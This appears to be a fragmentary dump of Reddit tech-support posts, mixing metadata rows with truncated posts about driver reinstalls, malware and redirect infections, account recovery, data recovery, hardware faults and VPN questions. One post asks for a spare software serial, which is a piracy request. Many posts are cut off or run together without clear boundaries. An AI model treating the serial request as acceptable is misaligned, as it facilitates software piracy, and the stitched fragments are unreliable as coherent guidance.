He forgot to tell me the DVD rom drive doesn't work so had to go get my external DVD rom drive. Tried to boot from it wasn't working. It was being detected during post but not showing up in BIOS or as an option to boot from. So I put the hard drive in my laptop install windows 7. Put the hard drive back in his laptop. BLUE SCREEN.

Opened up the command prompt and switched over to the DVD rom drive and ran the setup from there. and was able to install windows 7 from there. you have to tell it to relocate the windows files to windows.old  (assuming this because you are working off those files in the background if your try to format the drive first I am thinking it would just shutdown.)

So since nobody in this tech community can give legitimate solutions that work I snorted a line and took it upon my own ass to figure this shit out. Not sure if I succeeded but the drivers are back in, up to date and the video game detects them as the newest. So the solution - make sure everything is deleted, install everything from the official AMD site, the chipset and all the shit except all the different AMD video card drivers, then run dxdiag and your card should pop up there by the side of the integrated card, see what kind of series it is (5xxx, 6xxx, 7xxx etc.) and install the whole driver suite for the series manually. Not the 1mb version, it's about 150MB. That's how I did it, it works for now but I still can't install drivers from autodetect so I still fucked up.

So I done fucked up, 

I couldn't install the newest AMD drivers so I thought I'll look-up what google has to say, found a person who had the exact same issue, posted on some forum and responses said that I should delete the old drivers and install the new ones and so I did. I went to AMD website, downloaded the Catalyst Un-install Utility, wiped all the shit and now I can't install the drivers. I tried downloading the whole Catalyst Suite, nothing worked. I'm no IT guy and as far as I've been told I have anger issues so before my laptop flies into a wall on accident, maybe somebody know how to fix it? I'm not sure about the ATI card specs because dxdiag shows the integrated Intel Graphics card so as far as the sticker on the laptop says it's ATI Mobility Radeon and the laptop is HP Pavilion dv6 so if anybody ran into an issue like this before I'd really appreciate the help.

I can only speak for myself when I say I believe pirating should never be brought up as a resolution to a problem. Not ever. 

This Sub to me is about legitimate fixes to issues and should never get to the point of crossing the line of piracy to fix an issue or otherwise.


I do this on my own time, I don't get paid for it (nor do I get karma). I only help here because I have the capacity to but this bothers me. If I'm down-voted because people disagree with this - fine. This post will stay here regardless.


**Edit:** The intent, as stated, for this post was to improve the quality of responses for people seeking help on this Sub. I've answered many of your comments with an honest opinion and take no issue with you all down voting my posts in response to disagreeing with my opinions on what good tech support is or should be. I neither demanded that you stop suggesting resolutions as you choose to, nor did I try to sway your personal opinions. My post begins with ""Please"" and while blunt, was still a request. At no point have I pretended to be a mod, nor have I suggested it.

My opinion of piracy is my own and I am not forcing it down your throats. I made a simple request as someone who has been helping in my own time in hopes that the quality of responses improved from ""Oh, just go pirate x"" to at the very least, an attempt to solve the issue without piracy first before looking at alternatives.

I won't remove this post, nor will I delete any of my comments in an effort to stop being down voted. That said, as someone that's been helping for 4 months on this Sub - to have users go through my past comments purely to down vote me because of a disagreement of opinion on this post, frankly... I'm disappointed. I'm not upset or angry, you all are entitled to your opinion but, I would appreciate it if you left the posts where I freely helped other users intact."	t5_2qioo	True

I live in a flat shared with 4 other uni students, we get on quite well and we don't mind sharing the bills. But about 3 months ago one of my flatmates bought and started using a Devolo dLan 500 which plugs into the first port of our modem and leeches almost all of the bandwidth  away from the wifi that the rest of us use, dropping the download speed from an acceptable average of about 8.5mb/s to a craptastic 1.2 mb/s. 

Now normally i just unplug this electro-dickery but as of late my flatmate has complained about it.... at length.... apparently she doesn't get the speeds she's used to ""All the way in her room"" which is probably between 7 and 10 meters from the router and the exact same distance as i am typing this now.

So what I ask of you glorious high-priests of technomancy is: 
A) is it possible to assign maximum bandwidth uses separately to wifi and ethernet ports.

1359292971.0	17d8jf	My Hotmail account was compromised. Now blocked and I'm unable to recover it.		31	6	12	"I have to preface this by saying I am pretty damn desperate to get this resolved. I've had this account for around ten years and it is attached to virtually every online account I've made in that time. So obviously this is pretty stressful considering that if I can't recover the address, then I'm completely boned in a number of ways.

I went through the process of recovering my password, sent the code to my alternate email address, only to find that the alternate address had also been compromised, with no hope of recovering the backup address either. (I'm in the process of trying anyway, but I don't like my chances) There is a second backup email, but it's an old ISP address of mine that doesn't exist anymore. (Maybe it's possible to contact my old ISP to see if they can assist me in reopening the account temporarily so I can have the code, if I prove my identity. Anyone have any experience in this area?)

I went through the alternative recovery process (where you provide information specific to the account like emails recently sent, etc) but it failed the first time due to insufficient info. I tried live support twice which consisted only of being told to try the recovery process again, which was very unhelpful.

I was then locked out of the recovery process for 24 hours.

I tried the recovery process again today, and just got an email back saying it failed again. This time I provided a good deal more info, since I contacted people I had recently sent emails to to find out the exact subject lines as that's what the recovery process wants.

Now it just recommends I create a new account without so much as giving me a contact address to attempt to talk (and reason) with a real person. I'm absolutely sure I can prove this is my account beyond reasonable doubt but it seems that I have no form of recourse here.

**So, my question is: Is there anyone here who has been in this situation and managed to resolve it and regain access to their address, and if so, how did you go about it? If there are any Microsoft employees here who could assist me, I'd be eternally grateful.**

If it matters, here are some of the ways I think I could prove my ownership:

- I have a static IP which has been used to access the address for a while now. If it could be cross-referenced somehow with the address I am requesting assistance from, it should help prove I am the owner.

- I still have current emails in my portable devices I can quote and provide subject lines. That should help prove that I own the account and have been using it for some time.

- I have electronic versions of my bills sent this the address with my name and address on them. I can provide proof in the form of photographic ID that I am the same person the bills are addressed to.

- I can have some long time contacts I've had on Hotmail also send whatever necessary to authenticate me, which would help prove that I've known them since before the account was compromised.

I'm aware that some of these points are weak in some areas, but cumulatively I think they would be a good enough authentication of me as the Hotmail account owner.

So, my stupid friend somehow managed to get the FBI Moneypak virus on his computer.  I work at the tech support help desk at my university, so of course I'm the first person he calls.  Problem is, this virus is my nemesis.  I've tried absolutely everything I can think of.  

I tried a system restore, but it failed.  I tried loading Rkill and Malwarebytes onto the computer via flash drive, but the virus comes up as SOON as you log in, even in safe mode.  I made a Hiren's BootUSB.  

I booted into TinyXP and tried running Malwarebytes from there.  It found six files that were corrupted.  I removed them and rebooted the computer, but the virus is still there.  I've also tried using ClamAV, and he has Sophos on the computer, which didn't catch the virus in the first place.  

[This](http://botcrawl.com/how-to-remove-the-fbi-moneypak-ransomware-virus-fake-fbi-malware-removal/#manual) website has some suggestions, but basically none of them work.  The only one left to try is the registry one, and I can't access the registry because of the virus.

It happened once I installed uTorrent. uTorrent installed a toolbar, because I wasn't paying attention while installing, it is called the uTorrentControlv2. I have changed the default search engine in settings. I have uninstalled Chrome and re-installed it. I used Revo Uninstaller to find leftover files, or whatever they would be called.  I have removed the extension from Chrome. I completely uninstalled uTorrent, and then uninstalled and re-installed Chrome. I went into my hard drive and searched the files, it came it with a couple files that were obviously related to the toolbar, I deleted those. 

I did not have this problem before I installed uTorrent. But now, even though I have tried all of these things to get rid of it, I simply cannot. Even when I uninstall and re-install Chrome, the toolbar is still there when I start it up. Whoever made this toolbar did a very good job. I'm so unbelievably frustrated right now.

Please help. 	twitter-SireOwl	34	7	46	"The data still exists, I've attempted to recover it through a large variety of software but can't seem to find anything compatible with HFS+ partitions (MAC). 

I've attempted to recover that HFS partition from the HDD, and can narrow down the sectors where it's located. ""Active partition recovery tool 7.1.2"" seems to be able to do the thing, however, I can't get through it's online ordering process. Admittedly I've attempted to find it for free, but can't seem to find the current version, the only one that works. 
Could anyone by divine chance have a spare serial of this?

If not, is there anyone with partitioning knowledge that can help? I'm running on W7 on the hard drive now. I can run Linux through a CD, and am able to communicate through a USB-SATA interface to another mac. (To expand recovery possibilities). 


Edit: Still not fixed - I'm at the data but can't tap it. So far yet so close...
Time for my nice phrase: ""All computers are shit. Some less than others."" Prove me wrong, we've all faced shitty tech situations here ):

Edit 2, six to seven hours later: I've managed to recover a portion of the HFS+ filesystem, convert it to a simpler FAT filesystem, and recover about 1/3 of the data. The rest is a bit beyond my knowledge of TestDisk and the linux terminal to retrieve; no other programs seem to detect that damned partition in its complete state other than Active Partition Tool 7.1.2 - unlucky for me, the recovered batch of data contains photos of my client's dog, some OSX system files and a few messed up files of movies. I need the work archives, which the smart man never backed up, to get the lot of my pay! Where this is, I don't know, there's a few thousand sectors to guess. DiskWarrior has managed to read through a low-level copy I've made of the HDD in question, currently at 7.46% (sloooow), doesn't seem to be working very well. Thank's for the help! Things have definitely been better since this post. 

Edit 3. I did not burn up, as in flames, a copy of the mans HDD. That was an experience I had a very long time ago with a rather shitty damaged beyond reason beat up 50GB HDD that unsafely overheated and started burning through soldering material in it (I suspect), then igniting the thing. I do not do this for a full time job, it is a hobby, and am not american, I am Mexican. Computer repair, especially mac related, is rather limited. I know a thing or two, so call me incompetent if you wish, that's just how it is. I am not really charging this guy very much,  right about 700-800 pesos is what I've told him. That's about 60 dollars I think. Not very much for this type of shit.  I can't do much more, I'm not that tech savvy.  With considerable difficulty for me I recovered about 1/3 of the files, the rest of the data is gobbled up shit TestDisk can't comprehend and other software is either incompatible or out of my reach. 

People, this is mexico. How the hell do I order something from the US without a proper credit card? I'm rather poor so as to get an international credit card to do so, and interest rates are 20%-45% here for such cards. Again, thank you for the help. I'm quite tired and will mark this as solved, it's as far as I'll go, maybe I'll get paid half the money. Good day to you all!

Final edit. Retrieved about 35% of the data, most of it useless. Pictures, a few .rtf files, some music, system data. Enough is enough, tech knowledge here is scarce and can't seem to find much else to help me. Got paid 55 dollars. Gotta fix some other simpler things. Thanks reddit!"	t5_2qioo	True

1338466010.0	udqo1	I work for a radio station and we're having a really strange technical issue that I can't figure out. Help?	Chexjc	26	2	22	"Our radio personalities are live-on-air most of the day, but voice-track (pre-record) a few hours of show on a couple of stations every day. This is a pretty simple process. The tracks are recorded, converted to a required format (.wav files) and transferred over our server from the production computer to the on-air computer where the files are recognized and played through a program (Simian).

The weirdest thing is happening and I'm completely stumped. The audio sounds fine on the production computer. The levels are right, clarity good, etc. But once transferred over the server, the wav files play very low and distorted on a couple of other computers on the network. Some work fine, some don't (including the on-air computer -- which is the main issue here...that is, we're sounding like shit on the air). 

To sum up, the transfer of the files over the server is messing with them in someway. They sound bad in all programs once transferred.

Some computers are running Windows XP and some are on 7, but the two used in this predicament are both on XP. My lastest theory is that there is some sort of firewall that is distorting the files because it doesn't want to permit them to go through...but I've never heard of such of a thing. Where files are fine until transferred over a local network. Is that something that actually happens?

Does anyone have any idea? Thanks in advance -- any input or ideas are greatly appreciated!

I was immediately greeted with the Windows 7 SP1 update (which took forever). After the update, I noticed my PC was stuck at 100% CPU usage, and this was forcing it to shut down.

My first step was to remove and re-seat my RAM, and that allowed my CPU usage to settle at 60%. (Please turn off and unplug your PC to do this).

When I noticed that the usage was still high, I ran MSE for viruses. No dice.

I went into my processes on Windows Task Manager, (right click the task bar at the bottom of your screen to start it) and saw that I had system idle process at 40% and mscorsvw.exe running at 60%. 

Note that the system idle process is just picking up slack, imagine this,
""Everything else""+""System idle process""=1 so .6+.4=1. I digress, So with a quick google search for MSCORSVW I see that it is just a MS program meant to compile updates.


From this point, open your command prompt (or type CMD in the run bar). These commands should work

""CD C:\Windows\Microsoft.NET\Framework64\v2.0.50727""

""ngen.exe ngen.exe executequeueditems""

and 

""CD C:\Windows\Microsoft.NET\Framework\v2.0.50727""

""ngen.exe ngen.exe executequeueditems""

This should eliminate the process by compilling everything that it needs to and letting it go back to the depths of hell where it belongs.

The situation is that I live in a house with five other roommates, all of which drink heavily and stay up late.  Unfortunately my room is ten feet from the living room, which has the TV, couches, and is basically where the drunks crash land at the end of a night of drinking. 

My problem is that with everyone making a ton of noise through the early hours of the morning causes me to lose a TON of sleep.  I've tried ear plugs but it's still not enough.  I've brought this up to my roommates in the moment, as well as when they're sober later, and nothing seems to get through to them.  &lt;/background&gt;

Is there any way I can limit the sound of the TV during specific hours of the night?  Or alternatively, is there any way I could turn the volume down on my own from my room?

My personal experience has lead me to believe that even though most vacuum cleaners are a source of electrostatic energy, some can be used to clean out a dusty case, as long as some rules are applied:  No high-speed/high-amp vacuum, hoses with metallic ends should be grounded, and do not rub the attachment across the components.

Using compressed air is an option, my concern is having to take the computer out to a well ventilated area to perform the task as to not have the dust settle back into the case.  I have seen people use compressed cans improperly (upside down), leaving a temporarily frozen surface, and if that component was hot there is a possibility of cracking due to rapid cooling.

Using the two in tandem seems more of a logical choice if you're in an environment where the case can not be removed.  Though when I find myself at a clients site I feel awkward carrying around their computer to a place I can blow the dust off of.

The drive goes on four soft pads, and screws from underneath the case into the bottom of the SSD drive.

The problem is that my SATA cable is an L-shape (or right angle) connector, and I can't plug it into my drive because the bottom of the case is in the way. And I can't just turn the drive upside down, there's no screw holes on the other side of the drive.

So what I did instead is I unscrewed the two screws on the rear of the drive. The front two are still screwed in, and it's on the soft pad things so there's a lot of flexibility. I can just lift up the back and the front will stay in place. This way I can get the SATA cable back there. But now it's just situated at a 30 degree angle or so.

1366726759.0	1cxpw4	Very, very strange mouse problems. I really don't know how else to word it for a title. Long post, as detailed as I could. (Resubmission - Previous one was at off-peak hours. Last try.)	Bluesroo	27	1	30	"I've had a Logitech G700 for about 1.5 years now (got it Christmas 2011). Last week it started acting up in a very strange way, completely out of the blue from what I can tell. This is happening on my VAIO laptop (previous generation, W7), roommate's home-built gaming pc (W7), roommate's VAIO laptop (current generation, W8), and my girlfriend's HP laptop (previous generation, W7). Same exact problems across the board. I've tried 3 different mice on my computer ranging from $5 crap mouse, generic wireless Logitech mouse, and my roommates whose brand is slipping my mind. All of them work completely fine.

How to trigger the problems:

* Plug in mouse.

* Turn on mouse.

* That's it. The instant I flip the switch to turn off the mouse, ALL problems go away.

Break down of the issues:

* After turning on the mouse, not just plugging via cable or plugging in the wireless receiver, my mouse will no longer be able to do anything except move. Nothing will respond to the mouse, but the cursor still moves. I have my taskbar auto-hide. It will stop unhiding when I attempt to mouse over it. Programs will no longer respond to my mouse. It's like I'm clicking on blank space on my desktop every time I click.

* If I use my trackpad on my laptop with the G700 plugged in it is affected too.

* If I ctrl+alt+del and then click, stuff starts responding again. But the initial click doesn't do anything. I have to click once, then the ctrl+alt+del screen will respond.

* Once I do the ctrl+alt+del work-around, everything starts responding again, but weird ass bugs start popping up. Seemingly randomly.

List of weird ass bugs that sometimes happen and sometimes don't. All of these only arise once I do ctrl+alt+del. Seriously, it feel completely fucking random in regard to which of these bugs happen. Sometimes none of them do, except the Chrome one happens every single time:

* When I initially flip the switch to turn it on, sometimes the little scroll circle (don't know its name) pops up. It's the thing that pops up when you middle click on a webpage and allows you to scroll by moving the mouse.

* Shit will just start scrolling. Whatever is selected. If I press a volume button, it will start scrolling. Usually decreasing the volume. Webpages will scroll down or to the right. Documents will scroll. Weapons will scroll in videogames. Everything.

* If I start a game there will be 2 cursors, the in-game and Windows cursor. If I alt+tab out and back in then it is fixed.

* These issues are specific to Google Chrome: If I click ANY link, it opens in a new tab. If I click on any tab it will close. Even if I don't click the x on the right side of the tab, ANYWHERE ON THE TAB, it will close. This doesn't happen in any other browser.

What I have done to try and fix it:

* Uninstall all mouse drivers.

* Take out battery and put it back in.

* There is no official way to factory reset the G700. What I did was clear the profiles off of my computer. The next time the mouse came up in SetPoint (Logitech's customization software) it says something along the lines of ""Mouse not recognized, you must wipe the data on it to customize it on this computer, blah blah blah"". Did that, which puts the default profiles on it. Still no fix.

* Reinstall SetPoint.

* System restore to over a month before the problem appeared.

I have a feeling something in my mouse has been corrupted and it'll need to be RMA'd, but I figured I'd ask here first. I really hope you guys can help. [Here](http://www.tomshardware.com/forum/38738-63-computer-malfuntioning-task-unresponsive-mouse-registering) and [here](http://www.tomshardware.com/forum/63187-3-mouse-dysfunctional-unresponsive-icons-windows-task) are the two and only other threads I could find online with people who have this problem and neither have a solution.

Edit: Alright, I think /u/IBelieveAllTheThings got the closest to the problem. It is probably something wrong with my mouse sending signals it shouldn't somehow. I'm going to call Logitech and ask about getting it RMA'd. Thanks for the help!

Edit 2: Thanks /u/powercow and /u/delisl52 for prompting me to look at the physical button for middle click! Turns out to be a hardware failure in the middle mouse button so it is always pressed. The spring isn't returning it to the ""unclicked"" position. For the time being I just have the middle mouse button unassigned in SetPoint. I can still scroll and never use middle click anyways so at least it is functional if I can't get an RMA and until I do get one!

Edit 3: After tugging on it for a couple minutes the middle mouse button is now functional again. No RMA needed!"	t5_2qioo	True

I'm not as computer literate as I used to be, and when it comes to fixing this mess I have no idea where to even start. After taking it to a computer shop (where she was charged $100 or so dollars for AdAware and CCleaner to be installed - don't even get me started on *that* fiasco), I swear it came back in even worse shape than when we brought it in.

First off, I guess you guys and gals need the specs? Its running Windows Vista Basic, 32-bit, with Service Pack 1 installed. There are no restore points available and the virtual memory is set to have no paging file. I think she did that because the computer continuously runs out of hard drive space, and the ""computer repairman"" (I use that term loosely) told her it would free up hard drive space. I mean if you were to delete say a few gigabytes of photos, a low disk space warning would pop up in about ten minutes telling you there was zero space on the hard drive. I've no idea what the drive is getting randomly filled with, but its the most annoying thing I've seen in a long while.

There's also a virus that redirects Google searches, God only knows what other kind of mal- and spyware, and, according to Chrome, the computer is also infected with the Sirefef.gen!C virus. (That notification comes up with an SSL Error when trying to log into G-mail, Facebook, other secure sites, and whatnot.)

Running Microsoft Security Essentials gives me the error code 0x8050800d upon running a quick scan... A full scan crashes about an hour in - same with trying a scan with AdAware or even CCleaner. The same thing when trying to do *anything* time intensive, really... I assume because *nothing* can be done on the computer without a least few free kilobytes kicking around.

I'm at my wit's end trying to fix this damn thing. Every time I get a Low Disk Space reminder I wonder how well the thing would burn.

But anyway, is there anyone out there who would like to help me fix a sweet old lady's laptop? If I fix it, I've been promised cookies...

And I *love* cookies.

Thanks in advance.

1364402105.0	1b496x	[Windows 8] High disk usage, usually around 100%, and stays high when everything is closed. 3 month old computer, maintained by me when my wife isn't looking. Hoping for some advice while I keep looking.	comineeyeaha	31	6	36	"So I did all of the hardware tests when the problem started, thinking it was probably just disk errors or a crappy hard drive. Device health is fine, so I dug a little deeper. When the computer boots is the most consistent time I can track it down, but it only does it for a few minutes then stops before I can find the source. I notice that its usually ""Service Host: Local System (Network Restricted)"" that is at the top of the list when sorted by disk, but the reported usage is never higher than about 1MB/s. I started closing the individual categories under it, and it was still high, so I closed the whole process, then the problem went away. Problem is I can't see anything obvious that would make it so high. I'm fresh off of a reboot right now, after closing out that process, and so far it's fine, but I don't have faith that it won't return.

I'm still troubleshooting, but I thought I would ask here to see if anyone has any advice while I keep looking. I thought about just throwing a mid range SSD in here to get her going faster again, but if it's a system process I don't have faith that faster hardware will solve the problem.

I've never worked someplace with an IT team (onsite or contracted) and I want to know if I'm doing this right.

Here are some examples of tickets I've submitted. Is this OK or is there something I should be doing to make your lives easier?

**Subject: Add new computer to domain**

We have a Win7 Pro workstation at our [redacted] Location that needs to be added to our domain (a VPN between the two locations already exists.) 

While you're at [redacted], we would like the other workstation checked to see if an upgrade from Win Vista Home Premium to Win7 Pro is a feasible option at this time so it can be added to the domain as well. 

Any time within our normal business hours works, just schedule it and I will meet you there.

RonPolyp	33	9	25	"I'm a little irritated that my knowledge has a giant conceptual black hole in it where VPN is concerned, specifically in the context of an individual user (i.e., not trying to get two physically separated office LANs to talk to each other).  I have questions that I can't seem to answer to my satisfaction via Google.

* Except for gaming purposes, I normally run one Linux distro or another.  The only times I've ever wanted to access my home network remotely (usually from work), I've just ssh'd in.  Why would I rather set up a VPN (which looks like a bit of a pain in the ass, frankly)?

* Assuming you do connect two networks via VPN, how does IP addressing work?  Do they have to be on the same subnet?  How would DHCP work?  Do you have to worry about duplicating IP addresses?

There are other things, but at this point I don't even know enough to know what questions to ask.

Explain it like I'm... well, not five.  Maybe nine.  Yeah, that would be good.

Today with smart phones... its fairly constant. Losing audio, mysterious reboots, program crashes... if I am using my phone I'm getting atleast one issue every 2 days, major ones ever couple weeks (read major, spending 15-30 minutes fixing, minor is something I can ignore). 

I built my own computer 2 years ago when that laptop started to go (was dell), using the parts on newegg with the highest customer rating (and confirming components with someone more knowledgeable). On build two case fans of 4 were not working (came with a dent, gave me a gift card, case was amazon bought. Got one from newegg but that was because a rush order that was estimated for 3 days didnt' even get billed for 3 days. took a week. Had one bad memory stick out of 3 (giving me 8gb instead of 12), I didn't have time to address and it's not the end of the world so just lived with 8. A month or two later the secondary HD (1TB speed 7200rpm) began to have issue and I started backing it up on an external. Started having severe failures (1 out of 5 boots would succeed) and pulling the extra HDD fixed it. I just lived with my primary HDD for a long time and recently put the replacement they gave me in. Again its existence causes brief freezing on startup (after login).

I have had numerous issues with my SLI graphics cards (470s) mostly involving heat. Even when I first built it I had trouble running Crysis at 60fps on max settings, though I understand it wasn't taking advantage of SLI. I set up special profiles to keep the fan higher... which kept being overwritten for the boot profile. I had to say if the heat was reported above 30C to switch to this profile. One was hotter than the other because of position so I gave it extra fan speed. Then driver update... nvidia flipped the card numbering and I had heat related crashes until I figured it out. Now bot hrun at same higher speed. Had issues with recent game beta resulting in crashes, recommended using beta driver... which breaks my system because the cards don't seem to boot at all. No fan, no nothing 80% of the time. After install if it does work you can hear them fail, wait 10 seconds, then boot suddenly. Restarting computer generally doesn't get them to boot at all. Sometimes after a boot the explorer will freeze and I can move the mouse but everything else is frozen.

Recently I had my game crash and before an auto-reboot I saw the message flash ""Library Corrupted"". I don't know where it was, but it only happens in a particular game currently (and not mid play).

After trying to set up dual boot (given up after lost the extra HDD originally) I have had an MBR 3 error which I intend to use recovery to try and fix. It never caused issues but I am intending to run recovery when I find my disc.

Recently I've had games crash and on reboot my system isn't finding my primary hard drive, a couple reboots solves it.

I have dealt with inexplicible issues all my life, my coworkers didn't believe me when I started and said so, but they believed it after they started piling up. Often times turning to someone experienced who looks into it only to be met with a ""This makes no sense.""

I honestly deal with a program that cannot work, or a boot error, or some sort of failure on my computer that requires at least a half hour to fix once a week, a rare time of peace is 2-3 weeks.

**So here is my dumb question that makes me feel dirty to ask.** Could I be emitting a lot of static accumulated through environment that has caused this. I knew to ground myself when messing with the computer and didn't get any shocks then, but they are fairly common for me. Girlfriend's didn't much care for it... at one apartment i would get a good shock 0-2 times a day. This is where I built the computer. But no shocks then, but maybe a tiny bit of blood, which I hear isn't unusual. 

I hope I don't seem dumb because I don't think I am. A lifetime of this has taught me caution, learning what to solve, what can be ignored, what can be worked around. Crazy things to try that might solve an issue, how to recover from issues, how to be prepared and when to be alert of an oncoming issue. I really only have an issue when I am prevented from doing something so simple, like trying to run a program in the optimal age range (not too old for OS, not brand new), or trying to access a web page, or connect to the internet at all.

tl;dr; Can you really be computer cursed? Is accumulating too much static through habits which cause issues a real thing?

sigh, I'm gonna go do a clean install of my graphics driver.

Edit: After posting, my computer froze up. Anything I touched froze. Icons would highlight until i clicked them, froze, same with status bar, same with various applications. I feel like I'm at the end of this particular rope, which happens sometimes when I get all my errors coming back round. On netbook currently. Might have to not use my computer until I can get my disk for recovery. Or grab my files off the HDD so I don't have to worry about drive failure."	t5_2qioo	True

**Sunday update [04/22]**

Alright, so I took your advice. I stripped everything out. Jammed a piece of metal into the 24 pin motherboard cable and hooked power up to the machine. And.. it turned on! The power supply isn't broken it seems. I'll be removing the RAM and the videocard and just trying power on the mobo to see what happens. 

I present to you - [""Puter fixin' - Part 1""](http://www.youtube.com/watch?v=ILNeqq835RY)

If you have any other suggestions let me know. 
**=============================================================**

Hey folks,
About six months ago I built my first computer. I'm a software engineer but up until I actually started piecing together my first gaming rig I really didn't know a whole lot about computer hardware. 

I set this thing up, troubleshooted and isolated a bad memory problem and since then haven't had an issue with my new rig. I keep my computer set up in the living room usually but I was having a party last night and decided to unhook it and bring it into my bedroom for the night so nothing happened to it. This morning I set my station back up again, plug everything in, press the power button - *nadda*.

**DETAILS:**

* Corsair CMPSU-650TXV2 Enthusiast Series TX650 V2 Power Supply - 650 Watts, ATX, 140mm Fan, 80 Plus Bronze, SLI Ready, Active PFC
* Gigabyte GA-990XA-UD3 AMD 990X AM3+ ATX DDR3 3PCI-E16 2PCI-E1 2PCI SLI SATA3 USB3.0 Motherboard
* Crucial CT064M4SSD2 m4 2.5"" Solid State Drive 64 GB
* Western Digital Caviar Black 1TB SATA3 6GB/S 7200RPM 64MB Cache 3.5IN Dual Proc Hard Drive OEM
* Mushkin Enhanced Chronos MKNSSDCR120GB 2.5"" 120GB SATA III MLC Internal Solid State Drive (SSD)
* 4 X CORSAIR Vengeance 4GB 240-Pin DDR3 SDRAM DDR3 1600 (PC3 12800) Desktop Memory Model CMZ4GX3M1A1600C9B
* Corsair Graphite Series 600T Special Edition WHITE Mid-Tower Gaming Case ATX Case (CC600TWM-WHT)

[~~This is my little beauty. :(~~](http://i.imgur.com/xny1b.jpg)  [**Alright, the cables are fixed up.**](http://i.imgur.com/PX6OG.jpg)
Running windows 7.

**WHAT HAVE I DONE SO FAR?**

* I tried swapping the power cable with one I know for sure works (had it plugged into my monitor no problem)
* I've tried plugging it into four different outlets
* I've checked that all of the cables inside were not jiggled loose during the move to and from my room. 
* I've tried cleaning the fans around the power supply

Any advice on where to go from here? I can usually figure these things out when the computer will turn on. When it won't I'm at a bit of a loss on how to proceed. 

**edit - ~~Listen. I'm sorry. The cables are messy. I'm a slob, but I can still look myself in the eyes in the mirror and be okay with it. You guys can too! No more comments about messy cables.~~ Also, this a tremendous amount of feedback. Thanks guys.**

1364691373.0	1bbzoa	Yesterday, there was a post asking about useful toolkits. I did a comparison....	RunningInKumamoto	29	6	10	"After seeing [the post yesterday](http://www.reddit.com/r/techsupport/comments/1b8wjh/is_there_a_tool_kit_for_it_professionals/) on useful toolkits for techsupport professionals, there were a few that seemed similar but it was very hard to discern which was better or reasonably priced.  So, I put it into a spreadsheet to compare so that I would be sure to be buying what I wanted.

Upon inspection, there were a number of fluff parts that are not permanent, such as tape or 42 pcs terminals, that make the 'tool count' basically a moot point.

There were also many very similar tools, in terms of the purpose or even an exact match, that were named differently or had small differences.  

Of course there were also some tools that were entirely unique depending on the set. 

There were four sets that I looked at:

[""Rosewill 90 Piece Professional Computer Tool Kit"" $39.99 on Newegg.com](http://www.newegg.com/Product/Product.aspx?Item=N82E16899261004)

[""Syba 145-Piece Computer Tool Kit"" $36.99 on Newegg.com](http://www.newegg.com/Product/Product.aspx?Item=N82E16899263013)

[""Pro Tech Toolkit"" $59.95 on ifixit.com](http://www.ifixit.com/Tools/Pro-Tech-Toolkit/IF145-072)

[""Syba 100 Piece Computer Technician Tool Kit for Repairing, Wiring, Cleaning, and Testing"" $41.99 on Newegg.com](http://www.newegg.com/Product/Product.aspx?Item=N82E16899263023)

I only compared the first two which are in [this spreadsheet as a public google document](https://docs.google.com/spreadsheet/ccc?key=0AmOVN_lypyWGdGVwT2tSaG4zWmU5YnlCaWwtdVJkVkE&amp;usp=sharing).  I organized and color coded the data in a logical manner that actually makes sense and has matching descriptions.

I only compared these two because the second 100pc. Symba kit is basically the same thing, less pieces, and more expensive as the other Symba.  It is missing the soldering equipment and contains anti-static wrist strap and a spare parts box also compared to the other Symba.

The Ifixit.com tool kit was left out of the spreadsheet because it isn't really comparable to the others.  This kit seems to have a much simpler and sturdier set up.  It also appears to have a much higher quality of tools but things such as a soldering iron, vacuum, and basically any other electric tools are not in this kit.  Just a bunch of really nicely made tools to comfortably and precisely move physical parts like screws and chunks of metal.

Disclaimer: that I am buying one of these to get started, not from experience.  I have no experience with any of the tool sets IRL.  that being said, I think I have decided on the Symba 145 pc set because it is affordable and I am an amateur.  

I will also say that the two Symba's aren't spec'd on Newegg uniformly, which leads me to question the quality of their product.  Also, the 145 pc set is not properly pictured on Newegg.com.  Whatever that picture is is something else.

I want to thank everyone who submitted these toolkits to that thread yesterday and the OP as I had never seen these before.   Thanks to techsupport in general for always providing great info.  I did this for myself but wanted to give a little back to the sub too.

Feel free to leave comments/suggestions, especially if there is a toolkit that would compare well that wasn't considered.

One thing that I thought might have happened was that I might have given access to geolocation info to skype, but I am pretty sure I haven't done that (and I don't remember if the site has ever asked, ""... would like to use your current location ..."").

1314617237.0	jxvfk	Google redirect virus.  Has survived MBAM, HijackThis, and Combofix.	AlonsoQ	27	3	96	"I seem to have caught the search engine redirect bug that's going around.  I seems to be well-known in these parts since the search function turns up several posts on the subject.  I've combed through many of them and tried a several fixes, but so far the problem persists.

Things I have tried:

-System Restore

-MalwareBytes full scan

-HijackThis

-TDSSkiller

-SUPERAntiSpyware

-Flushing DNS cache

-Checking host file for suspicious entries

-Checking LAN settings for proxies

-Combofix

I can't guarantee the system restore point was before the problem started occurring.  MalwareBytes found a trojan, but nothing else, and didn't fix anything.  I've run HijackThis a few times and analyzed the logs on hijackthis.de, but everything seems to check out. TDSSkiller has come up blank.  I've run Super in both normal and safe mode, but it hasn't found anything beyond adware cookies.

Many topics recommended Combofix as the ultimate problem-solver when other programs failed.  The log (which I will gladly upload on request) testifies to the deletion of 10-20 files, with a few more ""failed to delete.""  Unfortunately, the redirections are just as persistent as before.

My OS is Vista.  Beyond the redirects, which happen every time I use Google and almost every time I use Bing, I've also noticed IE running in the background several times, and have been receiving messages that IE or Windows Explorer have stopped working every few hours.

At this point I'm looking into ways to create a boot disk and reinstalling the entire OS, but I want to exhaust all my other options first.  You're my only hope, r/techsupport.

**Update:** Thanks to everyone who has contributed suggestions so far.  The hosts file is clean as best I can tell.  I'm currently running a full scan with Microsoft Safety Scanner in normal mode.  I've been working on this for the past several hours, so I'll let the scan run for another hour or so and grab a nap before work.  If that doesn't turn up anything I'll go back to safe mode and try repairing the MBR.  Keep the ideas coming. I really appreciate all the support, and will respond to any reasonable suggestion in this thread until we crack this thing."	t5_2qioo	True

So I'm part of a fairly big (~200 folks) all volunteer based non-profit. We have heavy communications needs. We have a board of directors with 9 members. Each year, 3 are replaced thus every 3 years there's an entire new board. The rest of the org's membership is also very dynamic. The flow of the org revolves around a public event we throw once a year.

**What We Use:**

Mostly, Google Apps. We were a free customer for a long time but have recently started paying for the service. Google Apps is almost good. Most everyone in the org struggles to keep anything remotely organized on Drive. Nobody seems to use the calendar effectively at all. And lots of members just forward their org emails on to personal email accounts and ignore the rest of Docs. It's a sharing and account access nightmare sometimes (share notifications get forwarded to accounts that don't have direct access to read, for example).

It could be... I'm willing to admit... that we're already on a workable platform and we just need to focus on training... 

**What I'm Asking:**

